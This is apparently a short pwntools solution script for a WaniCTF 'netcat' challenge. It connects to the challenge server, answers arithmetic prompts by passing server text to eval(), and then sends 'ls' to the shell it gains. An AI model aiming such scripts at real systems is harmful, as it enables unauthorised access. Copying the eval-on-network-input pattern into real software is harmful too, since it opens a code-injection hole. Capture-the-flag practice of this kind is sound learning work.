# resolved
# coding=utf-8
from pwn import *

host = "netcat-pwn.wanictf.org"
port = 9001
r = remote(host, port)
a = True
ch = 0
while a:
    answer = r.recv().decode('utf-8')
    print(answer)
    ch += 1
    if '=' in answer:
        x = answer.split()
        # print(x)
        fun = x[len(x) - 4] + x[len(x) - 3] + x[len(x) - 2]
        otv = bytes(str(eval(fun)), 'utf-8')
        #otv = eval(fun)
        print(otv)
        r.sendline(otv)
    if ch > 4:
        r.sendline("ls")